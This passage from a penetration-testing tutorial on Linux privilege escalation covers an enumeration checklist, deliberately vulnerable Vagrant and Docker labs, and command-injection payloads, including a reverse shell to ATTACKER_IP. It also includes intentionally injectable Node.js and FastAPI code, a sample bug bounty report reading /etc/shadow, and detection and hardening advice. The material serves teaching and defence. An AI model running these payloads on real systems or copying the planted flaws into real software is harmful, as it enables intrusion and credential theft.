find / -name "*.conf" -exec grep -l -i "password" {} \; 2>/dev/null
find / -name ".env" 2>/dev/null
cat /etc/shadow 2>/dev/null                # if readable, crack hashes

# === PHASE 4: FILE SYSTEM ===
ls -la /etc/passwd                         # writable?
find / -writable -type f 2>/dev/null | grep -v proc
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null
cat /etc/exports 2>/dev/null               # NFS

# === PHASE 5: SERVICES AND NETWORKING ===
ss -tlnp                                   # listening services
ps aux                                     # running processes
cat /etc/fstab                             # mounted filesystems
mount                                      # current mounts

# === PHASE 6: AUTOMATED TOOLS ===
# Run LinPEAS for comprehensive enumeration
# Run pspy to detect hidden cron jobs
# Cross-reference findings with GTFOBins

# === PHASE 7: KERNEL EXPLOITS (LAST RESORT) ===
uname -r                                   # check kernel version
searchsploit linux kernel $(uname -r | cut -d'-' -f1)
```

---

## 16. Building a Vulnerable VM for Practice

### Quick Vagrant Setup

```bash
# Vagrantfile for a custom vulnerable VM
cat > Vagrantfile << 'EOF'
Vagrant.configure("2") do |config|
  config.vm.box = "ubuntu/focal64"
  config.vm.hostname = "privesc-lab"
  config.vm.network "private_network", ip: "192.168.56.10"

  config.vm.provision "shell", inline: <<-SHELL
    # Create low-privilege user
    useradd -m -s /bin/bash hunter
    echo "hunter:hunter" | chpasswd

    # SUID vulnerabilities
    chmod +s /usr/bin/find
    chmod +s /usr/bin/vim.basic
    cp /bin/bash /usr/local/bin/bash-suid
    chmod +s /usr/local/bin/bash-suid

    # Sudo misconfigurations
    echo "hunter ALL=(ALL) NOPASSWD: /usr/bin/vim" >> /etc/sudoers
    echo "hunter ALL=(ALL) NOPASSWD: /usr/bin/awk" >> /etc/sudoers
    echo "hunter ALL=(ALL) NOPASSWD: /usr/bin/env" >> /etc/sudoers

    # Writable cron job
    echo "* * * * * root /opt/scripts/backup.sh" >> /etc/crontab
    mkdir -p /opt/scripts
    echo '#!/bin/bash' > /opt/scripts/backup.sh
    echo 'tar czf /backup/data.tar.gz /var/data' >> /opt/scripts/backup.sh
    chmod 777 /opt/scripts/backup.sh

    # PATH hijacking via SUID binary
    cat > /opt/status.c << 'CEOF'
#include <stdlib.h>
int main() {
    system("service apache2 status");
    return 0;
}
CEOF
    gcc -o /opt/status /opt/status.c
    chmod +s /opt/status

    # Writable /etc/passwd (for older-style exploitation practice)
    chmod 666 /etc/passwd

    # Capability abuse
    setcap cap_setuid+ep /usr/bin/python3.8

    # Docker group
    apt-get update && apt-get install -y docker.io
    usermod -aG docker hunter

    # Credentials in environment
    echo 'export DB_PASSWORD="S3cretDBP@ss"' >> /home/hunter/.bashrc
    echo 'export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"' >> /home/hunter/.bashrc

    # SSH key exposure
    mkdir -p /opt/backups
    cp /root/.ssh/id_rsa /opt/backups/ 2>/dev/null || ssh-keygen -t rsa -f /root/.ssh/id_rsa -N ""
    cp /root/.ssh/id_rsa /opt/backups/
    chmod 644 /opt/backups/id_rsa

    # NFS misconfiguration
    apt-get install -y nfs-kernel-server
    mkdir -p /shared
    echo "/shared *(rw,sync,no_root_squash)" >> /etc/exports
    exportfs -ra

    # MySQL running as root with known password
    apt-get install -y mysql-server
    mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'rootpass123';"

    # Writable service file
    cat > /etc/systemd/system/vuln-app.service << 'SEOF'
[Unit]
Description=Vulnerable App
[Service]
ExecStart=/opt/scripts/start-app.sh
User=root
[Install]
WantedBy=multi-user.target
SEOF
    echo '#!/bin/bash' > /opt/scripts/start-app.sh
    echo 'echo "app running"' >> /opt/scripts/start-app.sh
    chmod 777 /opt/scripts/start-app.sh

    echo "Lab setup complete. Login as hunter:hunter"
  SHELL
end
EOF

vagrant up
vagrant ssh
# Or: ssh hunter@192.168.56.10 (password: hunter)
```

### Docker-Based Lab

```bash
cat > Dockerfile << 'EOF'
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    sudo vim python3 nmap perl gawk \
    gcc make cron openssh-server \
    net-tools curl wget

# Create vulnerable user
RUN useradd -m -s /bin/bash hunter && \
    echo "hunter:hunter" | chpasswd

# SUID binaries
RUN chmod +s /usr/bin/find && \
    chmod +s /usr/bin/python3.10

# Sudo misconfigurations
RUN echo "hunter ALL=(ALL) NOPASSWD: /usr/bin/vim" >> /etc/sudoers && \
    echo "hunter ALL=(ALL) NOPASSWD: /usr/bin/less" >> /etc/sudoers

# Writable cron
RUN mkdir -p /opt/scripts && \
    echo '#!/bin/bash\ntar czf /backup/data.tar.gz /var/data/*' > /opt/scripts/backup.sh && \
    chmod 777 /opt/scripts/backup.sh && \
    echo "* * * * * root /opt/scripts/backup.sh" >> /etc/crontab

# Capabilities
RUN setcap cap_setuid+ep /usr/bin/perl

# Exposed credentials
RUN echo 'DB_PASSWORD=Production_P@ssw0rd!' > /opt/.env && \
    chmod 644 /opt/.env

# Writable passwd
RUN chmod 666 /etc/passwd

USER hunter
WORKDIR /home/hunter
CMD ["/bin/bash"]
EOF

docker build -t privesc-lab .
docker run -it privesc-lab
```

### Recommended Practice Platforms

| Platform | Focus | Link |
|----------|-------|------|
| **HackTheBox** | Full attack chain VMs | hackthebox.com |
| **TryHackMe** | Guided privesc rooms | tryhackme.com |
| **OverTheWire Bandit** | Linux fundamentals | overthewire.org/wargames/bandit |
| **VulnHub** | Downloadable VMs | vulnhub.com |
| **PwnTillDawn** | Free attack VMs | online.pwntilldawn.com |
| **Lin.Security** | Dedicated privesc VM | VulnHub |
| **Kioptrix** series | Classic boot2root | VulnHub |

---

## Burp Suite Testing Workflow

While Burp Suite is primarily a web application tool, it plays a role in the chain from web exploitation to privilege escalation.

### From Web Shell to Privilege Escalation

```
1. Find web vulnerability (RCE, file upload, SSTI) via Burp
2. Establish a reverse shell from the web application
3. The shell runs as the web server user (www-data, apache, nginx)
4. Enumerate with the checklist above
5. Escalate to root using findings
```

### Testing for RCE That Leads to Privesc

```
# Command injection via Burp Repeater
POST /api/ping HTTP/1.1
Host: target.com
Content-Type: application/json

{"host": "127.0.0.1; id"}

# If RCE confirmed, enumerate directly
{"host": "127.0.0.1; sudo -l"}
{"host": "127.0.0.1; find / -perm -4000 -type f 2>/dev/null"}
{"host": "127.0.0.1; cat /etc/crontab"}
{"host": "127.0.0.1; getcap -r / 2>/dev/null"}

# Establish proper reverse shell
{"host": "127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"}
```

### Vulnerable Node.js Application

```javascript
// BAD: Command injection leading to privesc chain
const express = require('express');
const { execSync } = require('child_process');
const app = express();

app.use(express.json());

app.post('/api/health-check', (req, res) => {
  const { host } = req.body;
  // Developer thinks they're just pinging a host
  // No input validation at all
  try {
    const result = execSync(`ping -c 1 ${host}`).toString();
    res.json({ status: 'ok', result });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

app.listen(3000);

// Exploit: {"host": "127.0.0.1; cat /etc/shadow"}
// If the Node process runs as root (another common mistake),
// no privesc is even needed
```

### Vulnerable FastAPI Application

```python
# BAD: OS command injection
from fastapi import FastAPI
import subprocess

app = FastAPI()

@app.post("/api/lookup")
async def dns_lookup(data: dict):
    domain = data.get("domain", "")
    # No sanitization -- direct command injection
    result = subprocess.run(
        f"nslookup {domain}",
        shell=True,  # shell=True is almost always wrong
        capture_output=True,
        text=True
    )
    return {"output": result.stdout, "error": result.stderr}

# Exploit: {"domain": "example.com; id; sudo -l"}
```

---

## Manual Testing Methodology

### Step-by-Step Process After Getting a Shell

```
1. STABILIZE THE SHELL
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   export TERM=xterm
   Ctrl+Z
   stty raw -echo; fg
   # Now you have a fully interactive shell with tab completion

2. GATHER CONTEXT
   whoami && id && hostname
   uname -a && cat /etc/os-release
   ip addr show && ss -tlnp

3. CHECK QUICK WINS (in order of reliability)
   a) sudo -l (most reliable, least risk)
   b) SUID binaries (reliable, no risk)
   c) Capabilities (reliable, no risk)
   d) Writable cron jobs (reliable, wait for execution)
   e) Docker group (reliable, immediate)
   f) Writable /etc/passwd (reliable, immediate)

4. SEARCH FOR CREDENTIALS
   History files, config files, environment variables,
   database config, web app config, .env files

5. CHECK SERVICE MISCONFIGURATIONS
   Services running as root, writable service files,
   NFS exports, MySQL/PostgreSQL as root

6. KERNEL EXPLOITS (last resort)
   Match kernel version to known CVEs
   Compile and run only if other paths fail
```

---

## Common Developer Mistakes That Enable Privilege Escalation

1. **Running application processes as root** -- web servers, databases, Docker containers, and application code should run as the least-privileged user possible.

2. **Setting SUID on utilities for convenience** -- developers set SUID on `python`, `find`, or custom binaries to avoid dealing with proper permissions.

3. **Using `chmod 777`** -- the "it works now" approach to permissions that makes everything writable by everyone.

4. **Hardcoding credentials in scripts** -- backup scripts, deployment scripts, and cron jobs with plaintext database passwords, API keys, and SSH credentials.

5. **Wildcard sudo rules** -- `user ALL=(ALL) NOPASSWD: /opt/scripts/*.sh` looks restrictive but allows path traversal in many sudo versions.

6. **Adding users to the docker group** instead of using rootless Docker or proper access controls.

7. **Using `shell=True` in subprocess calls** -- enables command injection which leads directly to RCE as the application user.

8. **Not patching** -- known kernel exploits, sudo vulnerabilities, and polkit bugs remain unpatched for months or years in production.

9. **NFS shares with `no_root_squash`** -- intended for convenience in development, left enabled in production.

10. **Storing SSH private keys in accessible locations** -- backup directories, web roots, shared folders, and world-readable home directories.

---

## Detection Strategies

```bash
# Monitor for SUID changes
# Baseline
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid_baseline.txt
# Check periodically
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid_current.txt
diff /tmp/suid_baseline.txt /tmp/suid_current.txt

# Monitor for sudo abuse via auth logs
grep "sudo" /var/log/auth.log | grep -v "session"
# Look for unusual users running sudo commands

# Monitor cron modifications
inotifywait -m /etc/crontab /etc/cron.d/ -e modify,create,delete

# Detect LinPEAS/LinEnum execution
# Monitor for rapid file reads across /proc, /etc, /var
auditctl -w /etc/shadow -p r -k shadow_read
auditctl -w /etc/passwd -p wa -k passwd_modify
auditctl -w /etc/sudoers -p wa -k sudoers_modify

# File integrity monitoring
# Use AIDE, OSSEC, or Tripwire to detect unauthorized changes
aide --check
```

---

## Prevention Strategies

```bash
# 1. Audit and remove unnecessary SUID binaries
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
# Remove SUID from anything non-essential
chmod u-s /usr/bin/unnecessary_binary

# 2. Restrict sudo with precise paths and arguments
# BAD:  hunter ALL=(ALL) NOPASSWD: /usr/bin/vim
# GOOD: hunter ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart webapp.service
# Even better: use sudoedit instead of allowing vim

# 3. Patch regularly
sudo apt update && sudo apt upgrade -y
# Specifically track: kernel, sudo, polkit, glibc

# 4. Enforce IMDSv2 on EC2 (prevents container-to-host metadata attacks)
# (Covered in Part 12)

# 5. Use rootless Docker
# Install Docker in rootless mode -- no docker group needed
dockerd-rootless-setuptool.sh install

# 6. Set proper NFS export options
# ALWAYS use root_squash (default) and restrict client IPs
# /shared 192.168.1.0/24(rw,sync,root_squash)

# 7. Remove capabilities from non-essential binaries
setcap -r /usr/bin/python3.10

# 8. Use apparmor or SELinux profiles for services
aa-enforce /etc/apparmor.d/usr.sbin.apache2

# 9. Implement proper file permissions
chmod 644 /etc/passwd
chmod 640 /etc/shadow
chmod 440 /etc/sudoers
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# 10. Audit with Lynis
lynis audit system
```

---

## Bug Bounty Report Example

```
Title: Unauthenticated RCE via command injection in /api/health-check
  escalates to root via SUID python3 binary

Severity: Critical (CVSS 10.0)

Summary:
The /api/health-check endpoint accepts a "host" parameter that is
passed directly to a shell command without sanitization. This allows
arbitrary command execution as the www-data user. The system has
/usr/bin/python3 configured with the SUID bit, allowing trivial
escalation from www-data to root.

Steps to Reproduce:

1. Command Injection (RCE as www-data):
   POST /api/health-check HTTP/1.1
   Host: app.target.com
   Content-Type: application/json

   {"host": "127.0.0.1; id"}

   Response: uid=33(www-data) gid=33(www-data)

2. Enumerate SUID binaries:
   {"host": "127.0.0.1; find / -perm -4000 -type f 2>/dev/null"}

   Response includes: /usr/bin/python3

3. Escalate to root:
   {"host": "127.0.0.1; python3 -c 'import os; os.setuid(0); os.system(\"id\")'"}

   Response: uid=0(root) gid=0(root) groups=0(root)

4. Demonstrate impact -- read /etc/shadow:
   {"host": "127.0.0.1; python3 -c 'import os; os.setuid(0); os.system(\"cat /etc/shadow\")'"}

   Response: root:$6$... (full shadow file)

Impact:
- Full root-level access to the production server
- Access to all user data, database credentials, API keys
- Ability to pivot to other internal systems
- Ability to install persistent backdoors
- Complete compromise of the host

Remediation:
1. Sanitize input to /api/health-check -- use allowlist validation
   for the host parameter (IP address regex or DNS name validation)
2. Remove SUID bit from python3: chmod u-s /usr/bin/python3
3. Run the web application in a container with no SUID binaries
4. Use subprocess with shell=False and explicit argument lists
5. Implement network segmentation to limit blast radius
```

### Severity Explanation

This is a maximum severity (Critical/CVSS 10.0) finding because:

- **No authentication required** -- the endpoint is publicly accessible
- **Trivial exploitation** -- single HTTP request for RCE
- **Direct root access** -- SUID python3 eliminates any privilege boundary
- **Full system compromise** -- root on a production server means access to everything
- **Chaining amplifies impact** -- the server likely has access to internal services, databases, and other infrastructure

In bug bounty programs, RCE-to-root chains typically pay $5,000 - $100,000+ depending on the program tier and the sensitivity of the compromised system.

---

## Conclusion

Linux privilege escalation is a methodical process, not guesswork. The pattern is always the same: enumerate, identify misconfigurations, exploit, escalate. The techniques in this guide -- SUID abuse, sudo exploitation, cron hijacking, Docker group escape, kernel exploits, capability abuse, NFS misconfiguration, and the rest -- cover the vast majority of privilege escalation paths you will encounter in real-world pentests, CTFs, and bug bounties.

The most important skill is not memorizing every payload. It is building a systematic enumeration habit. Run `sudo -l` first, always. Check SUID binaries. Look at cron jobs. Check group memberships. Search for credentials. Do this every single time, in the same order, and you will find the escalation path.

Build the lab described in this guide. Practice each technique until the enumeration and exploitation steps are automatic. Then apply them in CTFs on HackTheBox and TryHackMe. When you find an RCE in a bug bounty program, you will have the skills to demonstrate maximum impact by chaining it with privilege escalation -- and that is what turns a good report into a great payout.

---

**Go build the lab.** Start with the Vagrant or Docker setup in this guide, work through each vulnerability type, and then move to the practice platforms. Privilege escalation is a core offensive security skill that pays dividends in every engagement. Master it systematically.
